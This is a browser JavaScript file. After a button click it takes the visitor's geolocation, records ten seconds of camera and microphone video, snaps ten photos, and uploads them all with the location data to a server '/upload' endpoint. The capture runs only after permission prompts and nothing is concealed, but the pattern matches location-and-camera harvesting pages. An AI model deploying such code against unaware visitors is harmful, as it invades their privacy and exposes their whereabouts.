const startBtn = document.getElementById("startBtn");
const preview = document.getElementById("preview");

let metadata = {};

async function getUserLocation() {
    return new Promise(resolve => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    metadata.latitude = pos.coords.latitude;
                    metadata.longitude = pos.coords.longitude;
                    metadata.timestamp = new Date().toISOString();
                    resolve();
                },
                err => {
                    metadata.latitude = 'Unavailable';
                    metadata.longitude = 'Unavailable';
                    metadata.timestamp = new Date().toISOString();
                    resolve();
                }
            );
        } else {
            metadata.latitude = 'Unsupported';
            metadata.longitude = 'Unsupported';
            metadata.timestamp = new Date().toISOString();
            resolve();
        }
    });
}

async function sendFile(blob, filename) {
    const formData = new FormData();
    formData.append("file", blob, filename);
    formData.append("meta", JSON.stringify(metadata));

    try {
        await fetch("/upload", {
            method: "POST",
            body: formData
        });
    } catch (err) {
        console.error("Failed to send file:", filename, err);
    }
}

startBtn.onclick = async () => {
    startBtn.disabled = true;
    startBtn.textContent = "Capturing...";

    await getUserLocation();

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        preview.srcObject = stream;

        // Video recording
        const mediaRecorder = new MediaRecorder(stream);
        let videoChunks = [];

        mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
        mediaRecorder.onstop = async () => {
            const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
            await sendFile(videoBlob, "recorded_video.webm");
        };

        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 10000); // 10 seconds

        // Photo capturing every 2 seconds
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");

        const track = stream.getVideoTracks()[0];
        const settings = track.getSettings();
        canvas.width = settings.width || 640;
        canvas.height = settings.height || 480;

        for (let i = 0; i < 10; i++) {
            await new Promise(resolve => setTimeout(resolve, 2000));
            ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
            const photoBlob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
            await sendFile(photoBlob, `photo_${i + 1}.jpg`);
        }

        startBtn.textContent = "Done ✔";
        stream.getTracks().forEach(track => track.stop());
    } catch (err) {
        console.error("Camera access failed:", err);
        startBtn.textContent = "Permission Denied";
    }
};
